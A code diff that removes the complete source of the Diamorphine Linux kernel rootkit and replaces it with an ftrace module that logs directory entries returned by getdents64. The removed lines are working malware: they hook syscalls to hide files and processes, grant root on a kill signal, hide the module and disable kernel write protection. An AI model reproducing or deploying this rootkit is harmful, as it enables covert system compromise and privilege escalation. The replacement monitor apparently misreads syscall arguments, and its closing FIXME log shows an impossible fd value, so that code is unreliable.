@@ -1,472 +1,224 @@
-#include <linux/sched.h>
+/*
+ * syscall_ftrace_getdents64.c
+ *
+ * 使用 ftrace 在系统调用入口监测 getdents64 输出文件名（只读/仅记录）
+ *
+ * License: GPL
+ */
+
 #include <linux/module.h>
-#include <linux/syscalls.h>
-#include <linux/dirent.h>
-#include <linux/slab.h>
-#include <linux/version.h> 
-
-struct linux_dirent {
-        unsigned long   d_ino;
-        unsigned long   d_off;
-        unsigned short  d_reclen;
-        char            d_name[1];
-};
-
-#define MAGIC_PREFIX "diamorphine_secret"
-
-#define PF_INVISIBLE 0x10000000
-
-#define MODULE_NAME "diamorphine"
-
-enum {
-	SIGINVIS = 31,
-	SIGSUPER = 64,
-	SIGMODINVIS = 63,
-};
-
-#ifndef IS_ENABLED
-#define IS_ENABLED(option) \
-(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
-#endif
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
-#define KPROBE_LOOKUP 1
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/ftrace.h>
 #include <linux/kprobes.h>
-static struct kprobe kp = {
-	    .symbol_name = "kallsyms_lookup_name"
-};
-#endif
+#include <linux/sched.h>
+#include <linux/uidgid.h>
+#include <linux/version.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
+#include <linux/fs.h>
+#include <linux/dirent.h>
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
-#include <asm/uaccess.h>
-#endif
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("非虫");
+MODULE_DESCRIPTION("使用 ftrace 监测 getdents64 文件名（只读）");
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-#include <linux/proc_ns.h>
+/* 模块参数 */
+static bool hook_getdents64 = true;
+module_param(hook_getdents64, bool, 0644);
+MODULE_PARM_DESC(hook_getdents64, "是否 hook getdents64");
+
+/* ftrace ops */
+static struct ftrace_ops ops_getdents64;
+
+/* kallsyms_lookup_name via kprobe */
+static unsigned long lookup_name(const char *name)
+{
+    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
+    typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
+    kallsyms_lookup_name_t kallsyms_lookup_name_func;
+    int ret;
+    unsigned long addr = 0;
+
+    ret = register_kprobe(&kp);
+    if (ret < 0) {
+        pr_alert("register_kprobe failed: %d\n", ret);
+        return 0;
+    }
+    kallsyms_lookup_name_func = (kallsyms_lookup_name_t)kp.addr;
+    unregister_kprobe(&kp);
+
+    if (!kallsyms_lookup_name_func) {
+        pr_alert("kallsyms_lookup_name not found\n");
+        return 0;
+    }
+
+    addr = kallsyms_lookup_name_func(name);
+    pr_info("lookup_name: %s @ %px\n", name, (void *)addr);
+    return addr;
+}
+
+/* 兼容宏 */
+#ifndef FTRACE_OPS_FL_RECURSION_SAFE
+#define MONITOR_FTRACE_FLAGS (FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY)
 #else
-#include <linux/proc_fs.h>
+#define MONITOR_FTRACE_FLAGS (FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY)
 #endif
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
-#include <linux/file.h>
-#else
-#include <linux/fdtable.h>
-#endif
-
-#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
-#include <linux/unistd.h>
-#endif
-
-#ifndef __NR_getdents
-#define __NR_getdents 141
-#endif
-
-// #include "diamorphine.h"
+/* ftrace 回调：打印 getdents64 的文件名 */
+static void notrace monitor_getdents64_thunk(unsigned long ip, unsigned long parent_ip,
+                                             struct ftrace_ops *ops, struct ftrace_regs *fregs)
+{
+    struct pt_regs *regs = ftrace_get_regs(fregs);
+    unsigned long fd = 0;
+    struct linux_dirent64 __user *dirent_user = NULL;
+    unsigned int count = 0;
+    char *kbuf = NULL;
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-unsigned long cr0;
+    fd = regs->di;
+    dirent_user = (struct linux_dirent64 __user *)regs->si;
+    count = regs->dx;
 #elif IS_ENABLED(CONFIG_ARM64)
-void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
-unsigned long start_rodata;
-unsigned long init_begin;
-#define section_size init_begin - start_rodata
-#endif
-static unsigned long *__sys_call_table;
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
-	static t_syscall orig_getdents;
-	static t_syscall orig_getdents64;
-	static t_syscall orig_kill;
+    fd = regs->regs[0];
+    dirent_user = (struct linux_dirent64 __user *)regs->regs[1];
+    count = regs->regs[2];
 #else
-	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
-		unsigned int);
-	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
-		struct linux_dirent64 *, unsigned int);
-	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
-	orig_getdents_t orig_getdents;
-	orig_getdents64_t orig_getdents64;
-	orig_kill_t orig_kill;
+    return;
 #endif
 
-typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-kallsyms_lookup_name_t lookup_name;
+    /* 总是打印 hook 被调用的信息，但对 count=0 做优化 */
+    if (count == 0) {
+        printk(KERN_INFO "monitor_getdents64_thunk called: pid=%d uid=%u fd=%lu count=0\n",
+               current->pid, __kuid_val(current_uid()), fd);
+        return;
+    }
 
-unsigned long *
-get_syscall_table_bf(void)
-{
-	unsigned long *syscall_table;
-	
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-#ifdef KPROBE_LOOKUP
-	register_kprobe(&kp);
-	lookup_name = (kallsyms_lookup_name_t) kp.addr;
-	unregister_kprobe(&kp);
-#endif
-	syscall_table = (unsigned long*)lookup_name("sys_call_table");
-	return syscall_table;
-#else
-	unsigned long int i;
+    printk(KERN_INFO "monitor_getdents64_thunk called: pid=%d uid=%u fd=%lu count=%u\n",
+           current->pid, __kuid_val(current_uid()), fd, count);
 
-	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
-			i += sizeof(void *)) {
-		syscall_table = (unsigned long *)i;
+    if (!dirent_user)
+        return;
 
-		if (syscall_table[__NR_close] == (unsigned long)sys_close)
-			return syscall_table;
-	}
-	return NULL;
-#endif
+    kbuf = kmalloc(count, GFP_ATOMIC);
+    if (!kbuf) {
+        pr_alert("kmalloc(%u) failed\n", count);
+        return;
+    }
+
+    if (copy_from_user(kbuf, dirent_user, count)) {
+        pr_alert("copy_from_user failed\n");
+        kfree(kbuf);
+        return;
+    }
+
+    /* 遍历 dirent64 结构 */
+    {
+        unsigned long offset = 0;
+        while (offset < count) {
+            struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf + offset);
+            char name[256];
+            size_t nlen = d->d_reclen - offsetof(struct linux_dirent64, d_name);
+            if (nlen > sizeof(name) - 1)
+                nlen = sizeof(name) - 1;
+            memcpy(name, d->d_name, nlen);
+            name[nlen] = '\0';
+
+            pr_alert("getdents64 pid=%d uid=%u fd=%lu name=%s\n",
+                     current->pid, __kuid_val(current_uid()), fd, name);
+
+            if (d->d_reclen == 0)
+                break;
+            offset += d->d_reclen;
+        }
+    }
+
+    kfree(kbuf);
 }
 
-struct task_struct *
-find_task(pid_t pid)
+/* 安装 ftrace hook */
+static int install_monitor_hook(struct ftrace_ops *ops, unsigned long func_addr)
 {
-	struct task_struct *p = current;
-	for_each_process(p) {
-		if (p->pid == pid)
-			return p;
-	}
-	return NULL;
+    int ret;
+
+    if (!func_addr || !ops)
+        return -EINVAL;
+
+    ret = ftrace_set_filter_ip(ops, func_addr, 0, 0);
+    if (ret) {
+        pr_alert("ftrace_set_filter_ip failed: %d\n", ret);
+        return ret;
+    }
+
+    ret = register_ftrace_function(ops);
+    if (ret) {
+        pr_alert("register_ftrace_function failed: %d\n", ret);
+        ftrace_set_filter_ip(ops, func_addr, 1, 0);
+        return ret;
+    }
+
+    pr_info("ftrace hook installed @ %px\n", (void *)func_addr);
+    return 0;
 }
 
-int
-is_invisible(pid_t pid)
+static void remove_monitor_hook(struct ftrace_ops *ops, unsigned long func_addr)
 {
-	struct task_struct *task;
-	if (!pid)
-		return 0;
-	task = find_task(pid);
-	if (!task)
-		return 0;
-	if (task->flags & PF_INVISIBLE)
-		return 1;
-	return 0;
+    if (!ops || !func_addr)
+        return;
+
+    unregister_ftrace_function(ops);
+    ftrace_set_filter_ip(ops, func_addr, 1, 0);
+    pr_info("ftrace hook removed @ %px\n", (void *)func_addr);
 }
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	int fd = (int) pt_regs->di;
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
-#elif IS_ENABLED(CONFIG_ARM64)
-	int fd = (int) pt_regs->regs[0];
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
-#endif
-	int ret = orig_getdents64(pt_regs), err;
-#else
-asmlinkage int
-hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
-	unsigned int count)
-{
-	int ret = orig_getdents64(fd, dirent, count), err;
-#endif
-	unsigned short proc = 0;
-	unsigned long off = 0;
-	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-	struct inode *d_inode;
-
-	if (ret <= 0)
-		return ret;
-
-	kdirent = kzalloc(ret, GFP_KERNEL);
-	if (kdirent == NULL)
-		return ret;
-
-	err = copy_from_user(kdirent, dirent, ret);
-	if (err)
-		goto out;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
-		proc = 1;
-
-	while (off < ret) {
-		dir = (void *)kdirent + off;
-		if ((!proc &&
-		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-		|| (proc &&
-		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else
-			prev = dir;
-		off += dir->d_reclen;
-	}
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err)
-		goto out;
-out:
-	kfree(kdirent);
-	return ret;
-}
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	int fd = (int) pt_regs->di;
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
-#elif IS_ENABLED(CONFIG_ARM64)
-		int fd = (int) pt_regs->regs[0];
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
-#endif
-	int ret = orig_getdents(pt_regs), err;
-#else
-asmlinkage int
-hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
-	unsigned int count)
-{
-	int ret = orig_getdents(fd, dirent, count), err;
-#endif
-	unsigned short proc = 0;
-	unsigned long off = 0;
-	struct linux_dirent *dir, *kdirent, *prev = NULL;
-	struct inode *d_inode;
-
-	if (ret <= 0)
-		return ret;	
-
-	kdirent = kzalloc(ret, GFP_KERNEL);
-	if (kdirent == NULL)
-		return ret;
-
-	err = copy_from_user(kdirent, dirent, ret);
-	if (err)
-		goto out;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
-		proc = 1;
-
-	while (off < ret) {
-		dir = (void *)kdirent + off;
-		if ((!proc && 
-		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-		|| (proc &&
-		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else
-			prev = dir;
-		off += dir->d_reclen;
-	}
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err)
-		goto out;
-out:
-	kfree(kdirent);
-	return ret;
-}
-
-void
-give_root(void)
-{
-	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
-		current->uid = current->gid = 0;
-		current->euid = current->egid = 0;
-		current->suid = current->sgid = 0;
-		current->fsuid = current->fsgid = 0;
-	#else
-		struct cred *newcreds;
-		newcreds = prepare_creds();
-		if (newcreds == NULL)
-			return;
-		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
-			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
-			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
-			newcreds->uid.val = newcreds->gid.val = 0;
-			newcreds->euid.val = newcreds->egid.val = 0;
-			newcreds->suid.val = newcreds->sgid.val = 0;
-			newcreds->fsuid.val = newcreds->fsgid.val = 0;
-		#else
-			newcreds->uid = newcreds->gid = 0;
-			newcreds->euid = newcreds->egid = 0;
-			newcreds->suid = newcreds->sgid = 0;
-			newcreds->fsuid = newcreds->fsgid = 0;
-		#endif
-		commit_creds(newcreds);
-	#endif
-}
-
-static inline void
-tidy(void)
-{
-	kfree(THIS_MODULE->sect_attrs);
-	THIS_MODULE->sect_attrs = NULL;
-}
-
-static struct list_head *module_previous;
-static short module_hidden = 0;
-void
-module_show(void)
-{
-	list_add(&THIS_MODULE->list, module_previous);
-	module_hidden = 0;
-}
-
-void
-module_hide(void)
-{
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	module_hidden = 1;
-}
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-asmlinkage int
-hacked_kill(const struct pt_regs *pt_regs)
-{
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	pid_t pid = (pid_t) pt_regs->di;
-	int sig = (int) pt_regs->si;
-#elif IS_ENABLED(CONFIG_ARM64)
-	pid_t pid = (pid_t) pt_regs->regs[0];
-	int sig = (int) pt_regs->regs[1];
-#endif
-#else
-asmlinkage int
-hacked_kill(pid_t pid, int sig)
-{
-#endif
-	struct task_struct *task;
-	switch (sig) {
-		case SIGINVIS:
-			if ((task = find_task(pid)) == NULL)
-				return -ESRCH;
-			task->flags ^= PF_INVISIBLE;
-			break;
-		case SIGSUPER:
-			give_root();
-			break;
-		case SIGMODINVIS:
-			if (module_hidden) module_show();
-			else module_hide();
-			break;
-		default:
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-			return orig_kill(pt_regs);
-#else
-			return orig_kill(pid, sig);
-#endif
-	}
-	return 0;
-}
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-static inline void
-write_cr0_forced(unsigned long val)
-{
-	unsigned long __force_order;
-
-	asm volatile(
-		"mov %0, %%cr0"
-		: "+r"(val), "+m"(__force_order));
-}
-#endif
-
-static inline void
-protect_memory(void)
-{
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	write_cr0_forced(cr0);
-#else
-	write_cr0(cr0);
-#endif
-#elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-			section_size, PAGE_KERNEL_RO);
-
-#endif
-}
-
-static inline void
-unprotect_memory(void)
-{
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	write_cr0_forced(cr0 & ~0x00010000);
-#else
-	write_cr0(cr0 & ~0x00010000);
-#endif
-#elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-			section_size, PAGE_KERNEL);
-#endif
-}
-
-static int __init
-diamorphine_init(void)
-{
-	__sys_call_table = get_syscall_table_bf();
-	if (!__sys_call_table)
-		return -1;
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	cr0 = read_cr0();
+#define NAME64 "__x64_sys_getdents64"
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot = (void *)lookup_name("update_mapping_prot");
-	start_rodata = (unsigned long)lookup_name("__start_rodata");
-	init_begin = (unsigned long)lookup_name("__init_begin");
-#endif
-
-	module_hide();
-	tidy();
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
-	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
-	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
+#define NAME64 "__arm64_sys_getdents64"
 #else
-	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
-	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
-	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+#define NAME64 "__x64_sys_getdents64"
 #endif
 
-	unprotect_memory();
-
-	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
-
-	protect_memory();
-
-	return 0;
-}
-
-static void __exit
-diamorphine_cleanup(void)
+/* 初始化与清理 */
+static int __init ftrace_getdents64_init(void)
 {
-	unprotect_memory();
+    unsigned long addr_getdents64 = 0;
 
-	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+    pr_info("ftrace_getdents64: init\n");
 
-	protect_memory();
+    memset(&ops_getdents64, 0, sizeof(ops_getdents64));
+    ops_getdents64.func = monitor_getdents64_thunk;
+    ops_getdents64.flags = MONITOR_FTRACE_FLAGS;
+
+    if (hook_getdents64) {
+        const char *names64 = NAME64;
+        addr_getdents64 = lookup_name(names64);
+        if (!addr_getdents64) {
+            pr_warn("getdents64 symbol not found\n");
+            return -ENOENT;
+        }
+
+        pr_info("found getdents64 symbol '%s' @ %px\n", names64, (void *)addr_getdents64);
+
+        int ret = install_monitor_hook(&ops_getdents64, addr_getdents64);
+        pr_info("install_monitor_hook returned %d\n", ret);
+    }
+
+    return 0;
 }
 
-module_init(diamorphine_init);
-module_exit(diamorphine_cleanup);
+static void __exit ftrace_getdents64_exit(void)
+{
+    if (ops_getdents64.func) {
+        unsigned long addr = lookup_name(NAME64);
+        pr_info("removing hook @ %px\n", (void *)addr);
+        remove_monitor_hook(&ops_getdents64, addr);
+    }
 
-MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
-MODULE_DESCRIPTION("LKM rootkit");
+    pr_info("ftrace_getdents64: exit\n");
+}
+
+module_init(ftrace_getdents64_init);
+module_exit(ftrace_getdents64_exit);
+
+// FIXME: monitor_getdents64_thunk called: pid=4331 uid=1000 fd=18446658827301191512 count=0
